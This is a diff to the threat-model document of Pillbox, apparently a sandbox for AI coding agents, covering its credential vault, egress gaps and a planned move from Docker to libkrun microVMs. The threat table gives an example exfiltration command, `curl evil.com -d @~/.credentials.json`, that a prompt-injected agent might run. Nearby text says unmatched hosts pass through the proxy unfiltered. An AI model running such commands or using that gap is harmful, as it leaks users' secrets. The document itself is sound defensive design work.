@@ -6,8 +6,18 @@ class: `gh`, `aws`, `docker`, `kubectl`. They all store credentials as
 plaintext files at 0600 under the user's home, and rely on the host's
 disk encryption for at-rest defense. Pillbox does the same.
 
+> **⚠️ Direction (2026-06-01): the isolation boundary is moving Docker → libkrun
+> microVM** (see [libkrun-sandbox.md](./libkrun-sandbox.md)). Everything below
+> describes the **shipped Docker** posture — shared-kernel containers, so
+> container-escape / kernel attacks are explicitly out of scope (rows below).
+> libkrun makes the boundary a **hardware VM** (KVM/HVF), closing exactly that
+> gap, and folds in **vault v2** (credential substitution only on a TLS handshake
+> verified to an allowlisted host + default-deny egress) and **non-negotiable
+> secret-file exclusion**. Don't read the rows below as the *target* posture —
+> they're what ships today; the spec is the target.
+
 > **Two gaps the vNext work must address** (tracked in [vnext.md](./vnext.md) /
-> [remotes-redesign.md](./remotes-redesign.md)): (1) the vault MITMs only
+> [remotes-redesign.md](./archive/remotes-redesign.md)): (1) the vault MITMs only
 > Anthropic/OpenAI/GitHub and **passes all other hosts through unmodified**
 > (`vault/server.rs:6`) — an agent can exfiltrate any other secret to an
 > unmatched host; the planned fix is strict-deny egress filtering (403 on
@@ -36,8 +46,8 @@ disk encryption for at-rest defense. Pillbox does the same.
 |---|---|
 | Prompt-injected agent exfiltrating its OWN credentials | The agent was given the credential on purpose. A malicious instruction telling it to `curl evil.com -d @~/.credentials.json` works. v0.4's vault tier replaces API keys with stubs + egress proxy; OAuth subscription tokens stay mounted because they're useless without the host's `claude` binary. |
 | Stolen unencrypted disk / backup | Files are plaintext at 0600. If FileVault / LUKS / BitLocker isn't on, an attacker with the disk has the secrets. Same posture as `~/.aws/credentials`. |
-| Compromised Docker daemon | Pillbox uses standard `docker run`. A root-equivalent Docker compromise is out of scope. The v0.6 remote-sandbox model can move agents off the developer machine entirely (VPS / E2B) for cases where the local Docker daemon is the wrong trust boundary. |
-| Kernel-level or hypervisor attacks | Docker shares the host kernel. Moving execution to a remote, hardware-isolated host (v0.6) is the answer for workloads that need defense at this tier. |
+| Compromised Docker daemon | Pillbox uses standard `docker run` today. A root-equivalent Docker compromise is out of scope. *Direction:* the [libkrun pivot](./libkrun-sandbox.md) removes the Docker daemon from the trust path entirely (no daemon — a linked library + a microVM). |
+| Kernel-level or hypervisor attacks | Docker shares the host kernel — out of scope today. *Direction:* [libkrun](./libkrun-sandbox.md) puts the agent behind a hardware-VM boundary (KVM/HVF), which is the answer at this tier — no remote host needed. |
 | Multi-user separation on a shared host | One secret store per OS user. 0600 blocks other non-root users from reading; a root user on the host bypasses it. |
 
 ## Where data lives (v0.6)
@@ -148,7 +158,7 @@ running the agent's OAuth flow in a one-shot container.
 
 `pillbox run --remote NAME` adds two new threat boundaries — the
 local helper subprocess (E2B) or `ssh` client, and the remote
-sandbox itself. The full design is in [remotes.md](./remotes.md);
+sandbox itself. The full design is in [remotes.md](./archive/remotes.md);
 the security-relevant pieces:
 
 ### What crosses the wire
